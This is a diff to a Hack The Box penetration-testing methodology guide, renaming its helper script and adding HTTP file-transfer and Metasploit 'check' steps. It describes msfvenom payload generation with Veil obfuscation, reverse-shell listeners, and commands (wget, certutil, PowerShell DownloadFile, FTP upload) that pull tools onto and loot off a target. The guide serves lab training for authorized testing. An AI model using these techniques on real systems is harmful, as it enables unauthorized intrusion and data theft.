@@ -3,11 +3,11 @@
 A repeatable workflow for HTB boxes: **Enumerate → Foothold → Privilege Escalation → Loot**.
 Only run this against machines you're authorized to test (HTB labs or your own systems).
 
-> Quick start with the companion script (full details in `htb-setup-howto.md`):
+> Quick start with the companion script (full details in `boxer-howto.md`):
 > ```
-> ./htb-setup.sh install                 # tools + AutoRecon + PEASS-ng + RootHound
-> ./htb-setup.sh roothound               # (background) auto-graph privesc from linPEAS uploads
-> ./htb-setup.sh workspace blue          # prompt IP -> /etc/hosts -> offers to run AutoRecon
+> ./boxer.sh install                 # tools + AutoRecon + PEASS-ng + RootHound
+> ./boxer.sh roothound               # (background) auto-graph privesc from linPEAS uploads
+> ./boxer.sh workspace blue          # prompt IP -> /etc/hosts -> offers to run AutoRecon
 > ```
 > While AutoRecon runs, `websurface` flags web entry points (uploads/logins/POST)
 > into `~/htb/blue/web-attack-surface.txt`. After you get a shell, run linPEAS on
@@ -17,7 +17,7 @@ Only run this against machines you're authorized to test (HTB labs or your own s
 
 ## 0. Setup / connect
 
-- Connect VPN: `./htb-setup.sh vpn lab.ovpn` → confirm with `ip a show tun0`.
+- Connect VPN: `./boxer.sh vpn lab.ovpn` → confirm with `ip a show tun0`.
 - Ping-check the box (some block ICMP; use `-Pn` in nmap if so).
 - Add hostnames to `/etc/hosts` when a box uses vhosts: `10.10.10.x  box.htb`.
 
@@ -60,7 +60,7 @@ nikto -host http://<ip>
 - Test login forms for default creds and SQLi.
 - Look for LFI/RFI, file upload, SSTI, IDOR, exposed `.git`/backups.
 - Hunt for leaked secrets in pages, JS, and JSON (creds, API keys, tokens):
-  `./htb-setup.sh secrets <ip> <box>` — automated crawl + regex scan
+  `./boxer.sh secrets <ip> <box>` — automated crawl + regex scan
   (this is the "find valuable info in Burp" job; Burp Community can't be scripted).
 
 ---
@@ -68,13 +68,15 @@ nikto -host http://<ip>
 ## 2. Foothold (initial access)
 
 - **Map version → exploit:** `searchsploit <product version>`; check GitHub/Exploit-DB.
-  Automated: `./htb-setup.sh exploits <box>` matches every fingerprinted service
+  Automated: `./boxer.sh exploits <box>` matches every fingerprinted service
   against Exploit-DB and lists known exploits (also runs at the end of AutoRecon).
   Remember a version match is a *lead*, not proof — read the exploit before running it.
+  RCE-looking hits are tagged [RCE?]. To validate safely without exploiting, use a
+  Metasploit module's `check`: `msfconsole -q -x "use <module>; set RHOSTS <ip>; check"`.
 - **Default & reused creds:** try everywhere; credentials found on one service often unlock another.
 - **Web to shell paths:** file upload → webshell; RCE via injection/SSTI; deserialization.
-- **Generate a payload:** `./htb-setup.sh shell` (picker) or e.g.
-  `./htb-setup.sh shell windows-exe <lhost> <lport>` — builds it with msfvenom into
+- **Generate a payload:** `./boxer.sh shell` (picker) or e.g.
+  `./boxer.sh shell windows-exe <lhost> <lport>` — builds it with msfvenom into
   `~/htb/serve` and prints the matching nc / multi-handler listener. Add `1` (or
   `SHELL_VEIL=1`) for a Veil-obfuscated Windows variant (`-msf` vs `-veil` names);
   note HTB boxes have no AV, so evasion is for learning, not needed to solve them.
@@ -89,13 +91,13 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 # then: Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
 ```
 - Grab `user.txt`. Record how you got in, in `notes.md`.
-- **Auto-find flags:** stage with `./htb-setup.sh flags`, deliver, then on the box run
+- **Auto-find flags:** stage with `./boxer.sh flags`, deliver, then on the box run
   `find-flags.sh` (Linux) / `find-flags.ps1` (Windows) to locate user.txt/root.txt.
 - **Transfer tools to the box:** stage payloads on your host and pull them from the
-  shell. Anonymous FTP delivery: `./htb-setup.sh ftp` (serves `~/htb/serve`, binds
-  tun0), then on the target `wget ftp://<you>/<file>` (Linux) or
-  `(New-Object Net.WebClient).DownloadFile('ftp://<you>/<file>','C:\Windows\Temp\<file>')`
-  (Windows). Use `FTP_WRITE=1` to pull loot back out.
+  shell. HTTP (best if FTP is blocked): `./boxer.sh http` then on the target
+  `wget http://<you>/<file>` / `certutil -urlcache -split -f http://<you>/<file> f`.
+  Anonymous FTP: `./boxer.sh ftp` then `wget ftp://<you>/<file>`; `FTP_WRITE=1`
+  lets the box upload loot back. The menu's option 9 prompts HTTP vs FTP.
 
 ---
 
@@ -119,7 +121,7 @@ Look at: writable files owned by root, service misconfigs, passwords in configs/
 whoami /priv                      # SeImpersonate -> Potato attacks
 systeminfo                        # patch level -> kernel exploits
 # WinPEAS / PowerUp / SharpUp for automated checks
-# Get compiled winPEAS:  ./htb-setup.sh peass   then deliver via ./htb-setup.sh ftp ~/htb/serve/peass
+# Get compiled winPEAS:  ./boxer.sh peass   then deliver via ./boxer.sh ftp ~/htb/serve/peass
 ```
 Look at: unquoted service paths, weak service perms, AlwaysInstallElevated, stored creds, token privileges, AD misconfigs (BloodHound).
 
